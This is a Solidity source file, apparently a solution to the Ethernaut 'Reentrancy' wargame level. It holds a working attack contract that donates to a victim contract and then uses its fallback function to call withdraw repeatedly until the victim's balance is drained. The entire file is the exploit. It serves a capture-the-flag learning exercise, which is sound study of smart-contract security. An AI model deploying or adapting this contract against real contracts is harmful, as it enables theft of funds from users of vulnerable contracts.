// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract EthernautReentrancyAttack {
  address payable victim;
  // from js console
  // await getBalance(instance)

  uint public amount = 0.001 ether;

  constructor(address payable _victim) public payable {
    victim = _victim;
  }

  function donate() public payable {
    bytes memory payload = abi.encodeWithSignature("donate(address)", address(this));
    victim.call{value: msg.value, gas: 4000000}(payload);
  }

  fallback() external payable {
    if (victim.balance != 0) {
      bytes memory payload = abi.encodeWithSignature("withdraw(uint256)", amount);
      victim.call(payload);
    }
  }

}